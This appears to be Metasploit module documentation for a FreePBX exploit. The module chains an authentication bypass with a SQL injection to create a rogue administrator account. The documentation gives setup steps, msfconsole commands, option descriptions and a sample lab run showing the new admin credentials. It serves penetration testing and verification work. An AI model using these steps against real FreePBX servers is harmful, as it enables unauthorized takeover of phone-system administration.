## Vulnerable Application

FreePBX is an open-source IP PBX management tool that provides a modern phone system for businesses
that use VoIP to make and receive phone calls.
Versions prior to 16.0.44 and 17.0.23 are vulnerable to multiple CVEs, specifically CVE-2025-66039 and
CVE-2025-61675, in the context of this module. The former represents an authentication bypass: when
FreePBX uses Webserver Authorization Mode (an option the admin can enable), it allows an attacker to
authenticate as any user. The latter CVE describes multiple SQL injections; this module exploits the
SQL injection in the custom extension component.
The module chains these vulnerabilities into an unauthenticated SQL injection attack that creates a
new fake user and effectively grants an attacker access to the administration.

To setup the environment, perform minimal installation from [here](https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso).

## Verification Steps

1. Install FreePBX
1. Start msfconsole
1. Do: `use auxiliary/gather/freepbx_custom_extension_injection`
1. Do: `set RHOSTS [target IP address]`
1. Do: `set USERNAME [FreePBX user]`
1. Do: `set FAKE_USERNAME [new username]`
1. Do: `set FAKE_PASSWORD [new password]`
1. Do: `run`


## Options

### FAKE_USERNAME

Username for fake injected user.

### FAKE_PASSWORD

Password for fake injected user.

### USERNAME

Performing authentication bypass requires the username of an existing user.
This username is used in the Authorization header along with a random password.

## Scenarios

```
msf auxiliary(gather/freepbx_custom_extension_injection) > set rhosts 192.168.168.223
rhosts => 192.168.168.223
msf auxiliary(gather/freepbx_custom_extension_injection) > set fake_username msfuser1
fake_username => msfuser1
smsf auxiliary(gather/freepbx_custom_extension_injection) > set fake_password msflab
fake_password => msflab
msf auxiliary(gather/freepbx_custom_extension_injection) > run verbose=true 
[*] Running module against 192.168.168.223
[*] Trying to create new fake user
[+] New admin account: msfuser1/msflab
[*] Auxiliary module execution completed
```
